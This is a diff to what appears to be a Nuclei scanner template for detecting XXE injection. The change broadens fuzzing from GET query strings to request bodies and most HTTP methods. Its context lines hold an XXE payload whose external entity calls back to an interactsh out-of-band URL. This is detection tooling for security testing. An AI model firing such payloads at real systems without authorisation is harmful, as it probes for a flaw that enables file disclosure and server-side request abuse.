@@ -6,7 +6,7 @@ info:
   severity: medium
   reference:
     - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
-  tags: fuzzing-req-query,xxe,dast,fuzzing-req-xxe
+  tags: fuzzing-req-query,xxe,dast,fuzzing-req-xxe,fuzzing-req-body
 
 variables:
   rletter: "{{rand_base(6,'abc')}}"
@@ -15,7 +15,7 @@ http:
   - pre-condition:
       - type: dsl
         dsl:
-          - 'method == "GET"'
+          - 'method != "OPTIONS"'
 
     payloads:
       xxe:
@@ -24,7 +24,7 @@ http:
         - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "http://{{interactsh-url}}"> ]><x>&{{rletter}};</x>'
 
     fuzzing:
-      - part: query
+      - part: request
         keys-regex:
           - "(.*?)xml(.*?)"
         fuzz:
